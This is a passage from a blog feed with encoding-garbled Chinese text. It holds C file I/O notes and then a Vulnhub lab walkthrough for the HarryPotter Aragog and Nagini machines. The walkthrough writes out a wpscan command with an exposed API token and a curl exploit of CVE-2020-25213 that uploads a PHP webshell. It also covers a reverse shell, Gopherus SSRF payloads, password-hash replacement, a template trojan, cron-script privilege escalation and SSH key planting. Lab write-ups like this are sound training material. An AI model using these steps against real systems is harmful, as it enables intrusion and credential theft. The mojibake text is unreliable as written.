id="æ ‡å‡†-I-O"><a href="#æ ‡å‡†-I-O" class="headerlink" title="æ ‡å‡† I/O"></a>æ ‡å‡† I/O</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen()"></a><code>fopen()</code></h3><p><code>fopen()</code> ï¼šæ‰“å¼€æ–‡ä»¶ï¼Œå’Œ python çš„ç±»ä¼¼ï¼Œæ–‡ä»¶æ‰“å¼€åä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆï¼ˆFILE* fpï¼‰ï¼Œå…¶ä»– I/O å‡½æ•°å¯ä»¥åˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘è¯¥æ–‡ä»¶ã€‚</p><p>æ–‡ä»¶æŒ‡é’ˆ fp å¹¶ä¸æŒ‡å‘å®é™…çš„æ–‡ä»¶ï¼Œå®ƒæŒ‡å‘ä¸€ä¸ªåŒ…å«æ–‡ä»¶ä¿¡æ¯çš„æ•°æ®å¯¹è±¡ï¼Œå…¶ä¸­åŒ…å«æ“ä½œæ–‡ä»¶çš„ I/Oå‡½æ•°æ‰€ç”¨çš„ç¼“å†²åŒºä¿¡æ¯ã€‚å› ä¸ºæ ‡å‡†åº“ä¸­çš„ I/O å‡½æ•°ä½¿ç”¨ç¼“å†²åŒºï¼Œæ‰€ä»¥å®ƒä»¬ä¸ä»…è¦çŸ¥é“ç¼“å†²åŒºçš„ä½ç½®ï¼Œè¿˜è¦çŸ¥é“ç¼“å†²åŒºè¢«å¡«å……çš„ç¨‹åº¦ä»¥åŠæ“ä½œå“ªä¸€ä¸ªæ–‡ä»¶ã€‚æ ‡å‡† I/O å‡½æ•°æ ¹æ®è¿™äº›ä¿¡æ¯åœ¨å¿…è¦æ—¶å†³å®šå†æ¬¡å¡«å……æˆ–æ¸…ç©ºç¼“å†²åŒºã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921160351234.png" alt="image-20210921160351234"></p><blockquote><p>å¦‚æœä½¿ç”¨ä»»ä½•ä¸€ç§â€wâ€æ¨¡å¼ï¼ˆä¸å¸¦xå­—æ¯ï¼‰æ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶çš„ å†…å®¹ä¼šè¢«åˆ é™¤ï¼Œä»¥ä¾¿ç¨‹åºåœ¨ä¸€ä¸ªç©ºç™½æ–‡ä»¶ä¸­å¼€å§‹æ“ä½œã€‚ç„¶è€Œï¼Œå¦‚æœä½¿ç”¨å¸¦x å­—æ¯çš„ä»»ä½•ä¸€ç§æ¨¡å¼ï¼Œå°†æ— æ³•æ‰“å¼€ä¸€ä¸ªç°æœ‰æ–‡ä»¶ã€‚</p></blockquote><h3 id="getc-putc"><a href="#getc-putc" class="headerlink" title="getc() putc()"></a><code>getc() putc()</code></h3><p>ä» <code>fp</code> æŒ‡å®šçš„æ–‡ä»¶ä¸­è·å–ä¸€ä¸ªå­—ç¬¦ï¼š<code>ch = getc(fp)</code></p><p>æŠŠå­—ç¬¦ <code>ch</code> æ”¾å…¥ FILE æŒ‡é’ˆ <code>fpout</code> æŒ‡å®šçš„æ–‡ä»¶ä¸­ï¼š<code>puts(ch , fpout)</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921162535749.png" alt="image-20210921162535749"></p><h3 id="æ–‡ä»¶ç»“å°¾"><a href="#æ–‡ä»¶ç»“å°¾" class="headerlink" title="æ–‡ä»¶ç»“å°¾"></a>æ–‡ä»¶ç»“å°¾</h3><p><code>getc()</code>å‡½æ•°åœ¨è¯»å–ä¸€ä¸ªå­—ç¬¦æ—¶å‘ç°æ˜¯æ–‡ä»¶ç»“å°¾ï¼Œå®ƒå°†è¿” å›ä¸€ä¸ªç‰¹æ®Šå€¼EOF</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921162741773.png" alt="image-20210921162741773"></p><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose()"></a><code>fclose()</code></h3><p><code>fclose(fp)</code>å‡½æ•°å…³é—­ fp æŒ‡å®šçš„æ–‡ä»¶ï¼Œå¿…è¦æ—¶åˆ·æ–°ç¼“å†²åŒºã€‚å¯¹äºè¾ƒæ­£å¼çš„ç¨‹åºï¼Œåº”è¯¥æ£€æŸ¥æ˜¯å¦æˆåŠŸå…³é—­æ–‡ä»¶ã€‚å¦‚æœæˆåŠŸå…³é—­ï¼Œ<code>fclose()</code>å‡½æ•°è¿”å› 0 ï¼Œå¦åˆ™è¿”å› EOF</p><h3 id="æŒ‡å‘æ ‡å‡†æ–‡ä»¶çš„æŒ‡é’ˆ"><a href="#æŒ‡å‘æ ‡å‡†æ–‡ä»¶çš„æŒ‡é’ˆ" class="headerlink" title="æŒ‡å‘æ ‡å‡†æ–‡ä»¶çš„æŒ‡é’ˆ"></a>æŒ‡å‘æ ‡å‡†æ–‡ä»¶çš„æŒ‡é’ˆ</h3><p><code>stdio.h</code>å¤´æ–‡ä»¶æŠŠ3ä¸ªæ–‡ä»¶æŒ‡é’ˆä¸3ä¸ªæ ‡å‡†æ–‡ä»¶ç›¸å…³è”ï¼ŒC ç¨‹åºä¼šè‡ªåŠ¨æ‰“å¼€è¿™3ä¸ªæ ‡å‡†æ–‡ä»¶,è¿™äº›æ–‡ä»¶æŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘FILE çš„æŒ‡é’ˆï¼Œæ‰€ä»¥å®ƒä»¬å¯ç”¨ä½œæ ‡å‡†I/Oå‡½æ•°çš„å‚æ•°ï¼Œ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921163203716.png" alt="image-20210921163203716"></p><h3 id="å¸¸è§å‡½æ•°"><a href="#å¸¸è§å‡½æ•°" class="headerlink" title="å¸¸è§å‡½æ•°"></a>å¸¸è§å‡½æ•°</h3><p><code>fprintf() fscanf()</code>ï¼šæ–‡ä»¶I/Oå‡½æ•°<code>fprintf()</code>å’Œ<code>fscanf()</code>å‡½æ•°çš„å·¥ä½œæ–¹å¼ä¸<code>printf()</code>å’Œ<code>scanf()</code>ç±»ä¼¼ï¼Œ åŒºåˆ«åœ¨äºå‰è€…éœ€è¦ç”¨ç¬¬1ä¸ªå‚æ•°æŒ‡å®šå¾…å¤„ç†çš„æ–‡ä»¶ã€‚</p><p><code>fgets() fputs()</code> : </p><p><code>fgets(buf, STLEN, fp);</code></p><p><code>rewind()</code>å‡½æ•°è®©ç¨‹åºå› åˆ°æ–‡ä»¶å¼€å§‹å¤„ï¼Œæ–¹ä¾¿ while å¾ªç¯æ‰“å°æ•´ä¸ªæ–‡ä»¶çš„å†…å®¹ã€‚æ³¨æ„ï¼Œ<code>rewind()</code>æ¥å—ä¸€ ä¸ªæ–‡ä»¶æŒ‡é’ˆä½œä¸ºå‚æ•°ã€‚</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164354552.png" alt="image-20210921164354552"></p><p>éšæœºè®¿é—®ï¼š<code>fseek()</code> <code>ftell()</code></p><p><code>fseek()</code>æœ‰3ä¸ªå‚æ•°ï¼Œè¿”å› int ç±»å‹çš„å€¼ï¼›<code>ftell()</code>å‡½æ•°è¿”å›ä¸€ä¸ª long ç±»å‹çš„å€¼ï¼Œè¡¨ç¤ºæ–‡ä»¶ä¸­çš„å½“å‰ä½ç½®</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164931750.png" alt="image-20210921164931750"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921164944854.png" alt="image-20210921164944854"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165007305.png" alt="image-20210921165007305"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165302520.png" alt="image-20210921165302520"></p><p><code>fgetpos() fsetpos()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210921165525047.png" alt="image-20210921165525047"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶æ“ä½œ&quot;&gt;&lt;a href=&quot;#æ–‡ä»¶æ“ä½œ&quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶æ“ä½œ&quot;&gt;&lt;/a&gt;æ–‡ä»¶æ“ä½œ&lt;/h1&gt;&lt;p&gt;ä»æ–‡ä»¶è¯»å–ä¿¡æ¯æˆ–è€…å°†ä¿¡æ¯å†™å…¥æ–‡ä»¶ï¼Œè¿™ç§ç¨‹åºä¸æ–‡ä»¶çš„äº¤äº’å½¢å¼å°±æ˜¯æ–‡ä»¶é‡å®šå‘&lt;/p&gt;
&lt;h2 id=&quot;ä¸æ–‡ä»¶é€šä¿¡&quot;&gt;&lt;a hre</summary>
      
    
    
    
    
    <category term="C" scheme="http://example.com/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhubé¶åœº</title>
    <link href="http://example.com/2021/09/05/Vulnhub%E9%9D%B6%E5%9C%BA/"/>
    <id>http://example.com/2021/09/05/Vulnhub%E9%9D%B6%E5%9C%BA/</id>
    <published>2021-09-05T04:12:12.000Z</published>
    <updated>2021-09-22T02:52:32.786Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulnhub"><a href="#Vulnhub" class="headerlink" title="Vulnhub"></a>Vulnhub</h1><p><a href="https://www.vulnhub.com/">https://www.vulnhub.com/</a></p><h2 id="ä¸€ã€HarryPotter-Aragog"><a href="#ä¸€ã€HarryPotter-Aragog" class="headerlink" title="ä¸€ã€HarryPotter: Aragog"></a>ä¸€ã€HarryPotter: Aragog</h2><blockquote><p>kaliï¼š192.168.1.15</p><p>Win10ï¼š192.168.1.7</p><p>é¶æœºï¼š192.168.1.101</p><p>2ä¸ªflag</p></blockquote><ol><li>ä½¿ç”¨<code>nmap</code>å‘ç°ä¸»æœºä½ç½®</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160201089.png" alt="image-20210810160201089"></p><ol start="2"><li>æ‰«æä¸»æœºå¼€æ”¾çš„ç«¯å£</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160406090.png" alt="image-20210810160406090"></p><ol start="3"><li>å¼€æ”¾äº†80ç«¯å£ï¼Œå°è¯•ç›´æ¥è®¿é—®è·å–ä¸€äº›ä¿¡æ¯ï¼Œä½†æ˜¯åªæœ‰ä¸€å¼ å›¾ç‰‡</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810160509837.png" alt="image-20210810160509837"></p><ol start="4"><li>å°è¯•æ‰«æç›®å½•ï¼Œè·å–ç½‘ç«™ä¿¡æ¯</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810161059271.png" alt="image-20210810161059271"></p><ol start="5"><li>è®¿é—®è¿™ä¸ªç½‘ç«™å‘ç°æ˜¯ä¸€ä¸ªwordpressæ­å»ºçš„ï¼Œæ‰¾åˆ°ç™»å½•æ¡†ï¼Œå°è¯•å¼±å£ä»¤ç™»å½•</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810162556360.png" alt="image-20210810162556360"></p><blockquote><p>æ›´æ”¹ä¸€ä¸‹ç”µè„‘çš„hostsæ–‡ä»¶å°±å¯ä»¥äº†åˆ©ç”¨åŸŸåè·³è½¬</p><p>å¼±å£ä»¤ï¼Œçˆ†ç ´ï¼Œsqlæ³¨å…¥éƒ½æ²¡æœ‰ç”¨ï¼Œåªèƒ½ç»§ç»­æŸ¥æ‰¾ä¸€äº›wordpressçš„å…¶ä»–æ¼æ´äº†</p></blockquote><ol start="3"><li>ä½¿ç”¨kaliä¸­è‡ªå¸¦çš„wpscanå·¥å…·ï¼Œæ‰«æwordpressç½‘ç«™çš„æ¼æ´</li></ol><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210810164905155.png" alt="image-20210810164905155"></p><blockquote><p>ç½‘é¡µä¸­å¥½åƒæç¤ºäº†ä¸€ä¸‹å¯èƒ½æœ‰æ’ä»¶æ¼æ´</p></blockquote><p>ä½¿ç”¨WPscanï¼Œéœ€è¦ä¸€ä¸ªWPscançš„API<code>gQumLltdtYVensaeqYQI6Gld1rKoodUNjkgdo0sNObo</code>æ‰èƒ½è¯†åˆ«æœ‰æ¼æ´çš„æ’ä»¶<code>wpscan --api-token=gQumLltdtYVensaeqYQI6Gld1rKoodUNjkgdo0sNObo --url http://192.168.1.101/blog -e p --plugins-detection aggressive</code><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812153011731.png" alt="image-20210812153011731"></p><p>å‘ç°äº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„æ¼æ´<code>CVE-2020-25213</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154341083.png" alt="image-20210812154341083"></p><ol start="4"><li><p>æ¼æ´åˆ©ç”¨</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/Salvere-Safe/p/14995249.html">https://www.cnblogs.com/Salvere-Safe/p/14995249.html</a></p><p><code>curl -F cmd=upload -F target=l1_ -F upload[]=@lcdm123.php -XPOST &quot;http://192.168.1.101/blog/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154915266.png" alt="image-20210812154915266"></p><p>è®¿é—®ï¼š<code>http://192.168.1.101/blog/wp-content/plugins/wp-file-manager/lib/files/lcdm123.php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812154932669.png" alt="image-20210812154932669"></p></li><li><p>ä¸Šä¼ æˆåŠŸï¼Œè¿æ¥shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812155252745.png" alt="image-20210812155252745"></p></li><li><p>æ ¹æ®ä½œè€…æç¤ºï¼Œè¿™é‡Œé¢æœ‰ä¸¤ä¸ªflag</p><blockquote><p>å¯ä»¥è®¿é—®ç½‘ç«™çš„é…ç½®æ–‡ä»¶è·å–å„ç§æ•æ„Ÿä¿¡æ¯ç­‰</p></blockquote><p>åœ¨<code>/home</code>ç›®å½•ä¸‹å‘ç°äº†ç¬¬ä¸€ä¸ªflag:angry:</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812161048745.png" alt="image-20210812161048745"></p><p>æ ¹æ®é…ç½®æ–‡ä»¶ä¸­çš„æ•°æ®åº“å¯†ç ç™»å½•æ•°æ®åº“</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812162133123.png" alt="image-20210812162133123"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812162150099.png" alt="image-20210812162150099"></p><blockquote><p>æ‰¾ä¸€ä¸‹æœ‰æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿ï¼Œå†°èä¸Šé¢æŸ¥ä¸äº†æ•°æ®åº“ï¼Œæ‰€ä»¥åªèƒ½é€‰æ‹©åå¼¹shell</p></blockquote></li><li><p>åˆ©ç”¨kaliè‡ªå¸¦çš„phpåå¼¹shellè„šæœ¬ä¸Šä¼ åˆ°ç½‘ç«™ç„¶åæ‰§è¡Œè·å–shell <code>/usr/share/webshells/php</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812171233121.png" alt="image-20210812171233121"></p><blockquote><p>éœ€è¦è‡ªå·±ä¿®æ”¹è„šæœ¬ä¸­çš„IP</p><p>ç„¶åç›´æ¥æ‰§è¡Œ  python3 -c â€˜import pty; pty.spawn(â€œ/bin/bashâ€);â€™  è·å–ä¸€ä¸ªttyshell</p></blockquote></li><li><p>ç™»å½•æ•°æ®åº“ï¼ŒæŸ¥çœ‹æ•°æ®åº“ä¸­çš„å†…å®¹ï¼Œè·å–æœ‰æ•ˆä¿¡æ¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812172434886.png" alt="image-20210812172434886"></p><p>åœ¨æ•°æ®åº“ä¸­å‘ç°äº†ç”¨æˆ·å’Œmd5åŠ å¯†çš„å¯†ç ï¼Œåˆ©ç”¨md5è§£å¯†ç½‘ç«™è§£å‡ºæ˜æ–‡å¯†ç ï¼Œç»“æœä¸º<code>password123</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812174109900.png" alt="image-20210812174109900"></p></li></ol><ol start="9"><li><p>å°è¯•ç”¨å¯†ç è¿æ¥shellï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆå°±ç›´æ¥æƒ³åˆ°è¿æ¥shhäº†ï¼Œåº”è¯¥æ˜¯æµ‹è¯•çš„ï¼‰ï¼Œè¿æ¥ä¸Šåè¦è€ƒè™‘å¦‚ä½•ææƒ</p><ol><li><p><del>SUIDææƒ</del> ï¼ˆæœªå‘ç°å¯ç”¨çš„å‘½ä»¤ï¼‰</p></li><li><p><del>sudoææƒ</del>ï¼ˆæ²¡æœ‰sudoï¼‰</p></li><li><p>è®¡åˆ’ä»»åŠ¡ææƒ</p><p>ç›´æ¥æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼Œåªèƒ½çœ‹è§è‡ªå·±çš„ï¼Œç„¶åæœç´¢ä¸€ä¸‹æ˜¯å¦å­˜åœ¨<code>.sh</code>è„šæœ¬</p><p><code>find / -name &quot;*.sh&quot;</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175029178.png" alt="image-20210812175029178"></p><p>è¿™ä¸ªå¥½åƒæ˜¯ä¸€ä¸ªå®šæ—¶è„šæœ¬ï¼ŒæŸ¥çœ‹æƒé™ï¼Œæœ¬åœ°å¯ä¿®æ”¹</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175106634.png" alt="image-20210812175106634"></p><p>åˆ©ç”¨<code>pspy</code>æŸ¥çœ‹æ‰§è¡Œè¿›ç¨‹çš„ç”¨æˆ·<a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813094946754.png" alt="image-20210813094946754"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813095033051.png" alt="image-20210813095033051"></p><p>UIDä¸ºé›¶è¡¨ç¤ºæƒé™ä¸ºrootï¼Œå¹¶ä¸”ä¼šå®šæœŸæ‰§è¡Œï¼Œæ‰€ä»¥ä¿®æ”¹è„šæœ¬ä¸­çš„å†…å®¹ææƒ</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175652834.png" alt="image-20210812175652834"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812175617973.png" alt="image-20210812175617973"></p><p>æˆåŠŸè·å–ä¸¤ä¸ªflag</p></li></ol></li></ol><p><strong>é—®é¢˜æ€»ç»“</strong></p><ol><li><p>åå¼¹shellæ—¶è‡ªå·±ç¼–å†™bashè„šæœ¬</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812164151619.png" alt="image-20210812164151619"></p><p>æˆåŠŸæ‰§è¡Œä½†æ˜¯æ²¡æœ‰shellè¿”å›</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210812164210859.png" alt="image-20210812164210859"></p><blockquote><p>æœªè§£å†³ï¼Œä¸çŸ¥é“åŸå› </p></blockquote></li><li><p>æ— æ³•å¯¹pspy64è¿™ä¸ªå·¥å…·èµ‹äºˆæƒé™</p><blockquote><p>å·²è§£å†³ï¼Œä¸Šä¼ å·¥å…·æ—¶çš„ç”¨æˆ·ä¸åŒï¼Œä¸Šä¼ å·¥å…·æˆ‘åˆ©ç”¨çš„èšå‰‘ï¼Œæ‰§è¡Œæ˜¯ç”¨çš„sshï¼Œå¯¼è‡´æƒé™å‡ºç°é—®é¢˜ï¼Œç›´æ¥åˆ©ç”¨sshä¸Šä¼ å·¥å…·å³å¯</p></blockquote></li></ol><p><strong>æ€»ç»“</strong></p><p>æ€»ä½“æ¥è¯´è¿™ä¸ªé¶åœºæ¯”è¾ƒç®€å•ï¼Œåˆ©ç”¨ç°æœ‰æ¼æ´ï¼Œè·å–shellï¼Œç„¶åè·å–æ–‡ä»¶è¿›è¡Œææƒæ“ä½œ</p><p>å‚è€ƒ</p><p><a href="https://nepcodex.com/2021/05/vulnhub-aragog-walkthrough-harry-potter-series/">https://nepcodex.com/2021/05/vulnhub-aragog-walkthrough-harry-potter-series/</a></p><h2 id="äºŒã€HarryPotter-Nagini"><a href="#äºŒã€HarryPotter-Nagini" class="headerlink" title="äºŒã€HarryPotter: Nagini"></a>äºŒã€HarryPotter: Nagini</h2><blockquote><p>é¶æœºï¼š192.168.1.12</p><p>kaliï¼š192.168.1.15</p><p>windows10 ï¼š192.168.1.7</p><p>3ä¸ªflag</p></blockquote><p>æ‰«ææœåŠ¡å™¨å¼€æ”¾çš„ç«¯å£</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813095946042.png" alt="image-20210813095946042"></p><p>ç»§ç»­æ‰«æï¼ŒæŸ¥çœ‹ç½‘ç«™å­˜åœ¨å“ªäº›ç›®å½•</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813100002238.png" alt="image-20210813100002238"></p><blockquote><p>å­—å…¸ä¸å¤Ÿå¼ºï¼Œæ¼æ‰«äº†ä¸€ä¸ªå…³é”®æ–‡ä»¶<code>note.txt</code>ï¼Œæ‰¾äº†è€åŠå¤©joomalçš„æ¼æ´ï¼Œç»“æœæ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813102611357.png" alt="image-20210813102611357"></p><blockquote><p>çœ‹åˆ°è¿™ä¸ªæ²¡æœ‰æ›´å¤šçš„æ€è·¯ï¼Œå…ˆçœ‹çœ‹å¤§å¸ˆå‚…ä»¬çš„æç¤ºï¼Œå†ç»§ç»­å§</p></blockquote><p>å¯ä»¥ç®€å•å®ç°HTTP3å·¥å…·ï¼š<a href="https://github.com/cloudflare/quiche%EF%BC%8C%E4%BD%9C%E8%80%85%E6%96%87%E7%AB%A0%EF%BC%9Ahttps://blog.cloudflare.com/enjoy-a-slice-of-quic-and-rust/%EF%BC%88%E5%8D%95%E8%AF%8D%E9%83%BD%E8%AE%A4%E8%AF%86%E5%B0%B1%E6%98%AF%E4%B8%8D%E4%BC%9A%E7%BF%BB%E8%AF%91%EF%BC%89">https://github.com/cloudflare/quicheï¼Œä½œè€…æ–‡ç« ï¼šhttps://blog.cloudflare.com/enjoy-a-slice-of-quic-and-rust/ï¼ˆå•è¯éƒ½è®¤è¯†å°±æ˜¯ä¸ä¼šç¿»è¯‘ï¼‰</a></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> quiche<br>cargo build --examples<br><br>å‘ï¼š<br>éœ€è¦ä½¿ç”¨æ–°ç‰ˆçš„rustï¼Œå¸è½½kaliåŸç‰ˆï¼šsudo apt-<span class="hljs-built_in">get</span> <span class="hljs-built_in">remove</span> rustc<br>ä¸‹è½½æ–°ç‰ˆï¼šcurl --proto <span class="hljs-string">&#x27;=https&#x27;</span> --tlsv1.<span class="hljs-number">2</span> -sSf http<span class="hljs-variable">s:</span>//<span class="hljs-keyword">sh</span>.rustup.rs | <span class="hljs-keyword">sh</span><br></code></pre></td></tr></table></figure><p>ç¼–è¯‘å¥½äº†ä¹‹åè¿›å…¥<code>/quiche/target/debug/examples</code>æ–‡ä»¶å¤¹ï¼Œæ‰§è¡Œå‘½ä»¤</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813123921031.png" alt="image-20210813123921031"></p><p>è®¿é—®phpæ–‡ä»¶</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125241635.png" alt="image-20210813125241635"></p><p>å°è¯•å‡ æ¬¡å¤‡ä»½æ–‡ä»¶è®¿é—®ï¼š<a href="http://192.168.1.12/joomla/configuration.bak">http://192.168.1.12/joomla/configuration.bak</a> æˆåŠŸä¸‹è½½ï¼Œå‘ç°æ•°æ®åº“ä¿¡æ¯</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813124519690.png" alt="image-20210813124519690"></p><p>çŒœæµ‹è¿™ä¸ªåœ°æ–¹å¯èƒ½å­˜åœ¨ssrf</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125330724.png" alt="image-20210813125330724"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813125418965.png" alt="image-20210813125418965"></p><p>ä½¿ç”¨<a href="https://github.com/tarunkant/Gopherus%E7%94%9F%E6%88%90payload%EF%BC%8C**payload%E9%9C%80%E8%A6%81%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%E6%89%8D%E6%9C%89%E6%95%88">https://github.com/tarunkant/Gopherusç”Ÿæˆpayloadï¼Œ**payloadéœ€è¦äºŒæ¬¡ç¼–ç æ‰æœ‰æ•ˆ</a>**</p><blockquote><p>MySQLå®¢æˆ·ç«¯è¿æ¥ç™»å½•æœåŠ¡å™¨æœ‰ä¸¤ç§æƒ…å†µï¼š</p><ol><li>éœ€è¦å¯†ç è®¤è¯æ—¶ä½¿ç”¨æŒ‘æˆ˜è¶Šå¤§æ¨¡å¼ï¼ŒæœåŠ¡å™¨å…ˆå‘é€saltç„¶åå®¢æˆ·ç«¯ä½¿ç”¨saltåŠ å¯†é¢è†œç„¶åéªŒè¯</li><li>æ— éœ€å¯†ç è®¤è¯æ—¶ç›´æ¥å‘é€TCP/IPæ•°æ®åŒ…å°±å¯ä»¥äº†</li></ol></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141426960.png" alt="image-20210813141426960"></p><p>æˆåŠŸè¿”å›æ•°æ®åº“åï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥ç›´æ¥æ‰§è¡Œè¯­å¥è·å–æ•°æ®åº“å†…å®¹äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813134232814.png" alt="image-20210813134232814"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813135606891.png" alt="image-20210813135606891"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813135936948.png" alt="image-20210813135936948"></p><blockquote><p>æ•°æ®åº“å¯†ç hashè§£ä¸å‡ºæ¥ï¼Œè¿™é‡Œå¯ä»¥è€ƒè™‘æ›¿æ¢hashã€</p><p>123456    e10adc3949ba59abbe56e057f20f883e</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141249058.png" alt="image-20210813141249058"></p><p>ç™»å½•åå°</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813141318613.png" alt="image-20210813141318613"></p><p>åœ¨æ¨¡æ¿å¤„å†™å…¥ä¸€å¥è¯æœ¨é©¬ ï¼Œå°†è¯¥æ¨¡æ¿åº”ç”¨äºç½‘ç«™ï¼Œè·å–shell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813142829660.png" alt="image-20210813142829660"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813143024308.png" alt="image-20210813143024308"></p><p>ç¬¬ä¸€ä¸ªflag</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813145728658.png" alt="image-20210813145728658"></p><p>å°†kaliè‡ªå¸¦çš„åå¼¹shellè„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œåå¼¹shellç„¶åæ‰§è¡Œ<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;);&#39;</code>è·å–ttyshell</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144148808.png" alt="image-20210813144148808"></p><p>åœ¨<code>/home/snape</code>ä¸‹å‘ç°äº†ç™»å½•å¯†ç </p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144758206.png" alt="image-20210813144758206"></p><p>ç™»å½•ssh</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813144821901.png" alt="image-20210813144821901"></p><p>ç°åœ¨è¦ä¹ˆè·å–åˆ°<code>hermonie</code>çš„æƒé™ç„¶åå†è·å–æœ€é«˜æƒé™ï¼Œè¦ä¹ˆç›´æ¥è·å–æœ€é«˜æƒé™</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813145219449.png" alt="image-20210813145219449"></p><blockquote><p>è¿™é‡Œå°±æ˜æ˜¾è¡¨ç¤ºéœ€è¦ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œå…ˆåˆ©ç”¨su_cpæ“ä½œè·å–åˆ°hermonieï¼Œç„¶åå†è·å–rootç”¨æˆ·æƒé™</p></blockquote><p>ç›´æ¥åˆ©ç”¨<code>su_cp</code>å‘½ä»¤å°†æ–‡ä»¶å¤åˆ¶å‡ºæ¥ å°±å¯ä»¥è·å–å†…å®¹äº†</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image/image-20210813150540843.png" alt="image-20210813150540843"></p><blockquote><p>å…¶ä»–å¤§ä½¬æ˜¯åˆ©ç”¨è¿™ä¸ªå¤åˆ¶å‘½ä»¤ç»™hermonieç”¨æˆ·æ·»åŠ sshå¯†é’¥</p></blockquote><p>åˆ©ç”¨kaliç”Ÿæˆå¯†é’¥å¯¹ï¼Œç„¶ååˆ©ç”¨su_cpå°†å…¬é’¥å†™å…¥ç”¨æˆ·çš„.sshç›®å½•</p><p>ç¬¬ä¸€æ­¥ç”Ÿæˆå¯†é’¥å¯¹,ä½¿ç”¨å‘½ä»¤<code>ssh-keygen</code></p><p>ç¬¬äºŒæ­¥å°†å…¬é’¥å†™å…¥æœåŠ¡å™¨ä¸­</p><p><img 